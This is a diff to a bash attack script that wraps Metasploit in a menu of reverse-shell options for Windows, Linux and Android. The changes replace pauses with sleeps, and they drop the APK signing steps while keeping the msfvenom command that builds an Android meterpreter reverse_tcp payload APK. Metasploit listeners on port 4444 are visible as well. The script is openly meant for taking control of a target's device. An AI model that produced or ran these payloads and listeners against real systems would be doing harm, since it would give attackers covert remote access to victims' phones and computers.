@@ -88,7 +88,7 @@ function windows_reverse_shell(){
 	set LPORT 4444; 
 	run;" 
 	echo "[!] Exploitation completed." | lolcat -a -d 1
-	read
+	sleep 5
 }
 
 
@@ -112,7 +112,7 @@ function linux_reverse_shell(){
 	set LPORT 4444;
 	run;"
 	echo "[!] Exploitation completed." | lolcat -a -d 1
-	read
+	sleep 5
 }
 
 
@@ -124,16 +124,7 @@ function android_reverse_shell(){
 	
 	#generating payload
 	echo "[!] Generating Payload." | lolcat -a -d 1
-	msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=4444 R> Revshell.apk
-	
-	#assigning different certificates to apk file 
-	#without these certififcate it wont be alloed to get installed in target device
-	echo "[!] Applying certificates to apk file." | lolcat -a -d 1
-	keytool -genkey -v -keystroke key.keystroke -alias hacked -keyalg RSA -keysize 2048 -validity 10000
-	jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore key.kerystore Revshell.apk hacked
-	jarsigner -verfiy -verbose -certs Revshell.apk
-	sleep 1
-	echo "[!] Certificates are applied to apk file." | lolcat -a -d 1
+	msfvenom --platform android -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=4444 R> $HOME/Revshell.apk
 	echo "[!] Revshell.apk is stored in $HOME directory." | lolcat -a -d 1
 	
 	#starting metasploit listener
@@ -144,7 +135,7 @@ function android_reverse_shell(){
 	set LPORT 4444;
 	run;"
 	echo "[!] Exploitation completed." | lolcat -a -d 1
-	read
+	sleep 5
 } 
 
 
@@ -167,8 +158,7 @@ function __main__(){
 			3) android_reverse_shell;;
 			0) exit;;
 			*) echo "[!] Invalid choise.";
-		esac
-		
+		esac	
 	done
 }
 #calling main function
